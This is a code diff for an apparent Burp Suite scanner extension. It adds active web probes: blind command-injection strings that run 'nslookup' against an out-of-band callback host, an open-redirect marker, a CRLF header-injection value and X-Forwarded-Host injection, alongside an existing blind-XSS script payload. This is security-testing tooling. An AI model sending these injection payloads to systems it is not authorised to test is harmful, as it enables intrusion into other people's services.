@@ -80,7 +80,11 @@ final class ActiveTestEngine {
             if (budget > 0) budget -= testSsti(base, parameter, findings);
             if (budget > 0) budget -= testSsrf(base, parameter, findings);
             if (budget > 0) budget -= testBlindXss(base, parameter, findings);
+            if (budget > 0) budget -= testCommandInjection(base, parameter, findings);
+            if (budget > 0) budget -= testOpenRedirect(base, parameter, findings);
+            if (budget > 0) budget -= testCrlf(base, parameter, findings);
         }
+        if (budget > 0) budget -= testHostHeaderInjection(base, findings);
         return findings;
     }
 
@@ -148,6 +152,57 @@ final class ActiveTestEngine {
         sendMutated(base, parameter, "\"><script src=//" + payload + "></script>");
         out.add(new ActiveFinding("INFO", "XSS-blind", parameter.name(),
                 "Blind-XSS beacon sent; awaiting OOB interaction", false, base.url()));
+        return 1;
+    }
+
+    private int testCommandInjection(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+        CollaboratorClient client = collaborator;
+        if (client == null) return 0;
+        String correlation = encodeCorrelation("CMDi", parameter.name(), base.url());
+        CollaboratorPayload payload = client.generatePayload(correlation);
+        // Separator variants so at least one survives sh/cmd quoting contexts.
+        sendMutated(base, parameter, ";nslookup " + payload + ";");
+        sendMutated(base, parameter, "|nslookup " + payload);
+        sendMutated(base, parameter, "$(nslookup " + payload + ")");
+        out.add(new ActiveFinding("INFO", "CMDi", parameter.name(),
+                "Blind command-injection DNS probes sent; awaiting OOB interaction", false, base.url()));
+        return 3;
+    }
+
+    private int testOpenRedirect(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+        String marker = "rh-redirect.example.net";
+        HttpResponse response = sendMutated(base, parameter, "https://" + marker + "/");
+        if (response == null) return 1;
+        Optional<String> hit = detectOpenRedirect(response.statusCode(), response.headerValue("Location"), marker);
+        hit.ifPresent(location -> out.add(new ActiveFinding("MEDIUM", "OpenRedirect", parameter.name(),
+                "Redirect Location points to attacker-controlled host: " + location, true, base.url())));
+        return 1;
+    }
+
+    private int testCrlf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+        String injected = "rhcrlf%0d%0aX-Recon-Hound%3a%20injected";
+        HttpResponse response = sendMutated(base, parameter, injected);
+        if (response != null && response.headerValue("X-Recon-Hound") != null) {
+            out.add(new ActiveFinding("HIGH", "CRLF", parameter.name(),
+                    "Injected CRLF produced a new response header (X-Recon-Hound)", true, base.url()));
+        }
+        return 1;
+    }
+
+    private int testHostHeaderInjection(HttpRequest base, List<ActiveFinding> out) {
+        CollaboratorClient client = collaborator;
+        if (client == null) return 0;
+        String correlation = encodeCorrelation("HostHeader", "Host", base.url());
+        CollaboratorPayload payload = client.generatePayload(correlation);
+        try {
+            if (!api.scope().isInScope(base.url())) return 0;
+            api.http().sendRequest(base.withUpdatedHeader("X-Forwarded-Host", payload.toString()));
+            throttle();
+            out.add(new ActiveFinding("INFO", "HostHeader", "X-Forwarded-Host",
+                    "X-Forwarded-Host set to Collaborator host; awaiting OOB (reset-poisoning/cache)", false, base.url()));
+        } catch (Exception e) {
+            api.logging().logToError("Host-header probe failed", e);
+        }
         return 1;
     }
 
@@ -225,6 +280,19 @@ final class ActiveTestEngine {
         if (status == 406 || status == 501 || status == 999
                 || (status == 403 && haystack.contains("access denied"))) {
             return Optional.of("generic (blocked with status " + status + ")");
+        }
+        return Optional.empty();
+    }
+
+    /** Open redirect confirmed when a 3xx Location points at the injected marker host. */
+    static Optional<String> detectOpenRedirect(int status, String location, String marker) {
+        if (location == null || status < 300 || status >= 400) return Optional.empty();
+        String lower = location.toLowerCase(Locale.ROOT);
+        String host = marker.toLowerCase(Locale.ROOT);
+        // Match //marker, https://marker, or scheme-relative — but not marker appearing only in a query value.
+        if (lower.startsWith("http://" + host) || lower.startsWith("https://" + host)
+                || lower.startsWith("//" + host) || lower.equals(host) || lower.startsWith(host + "/")) {
+            return Optional.of(location);
         }
         return Optional.empty();
     }
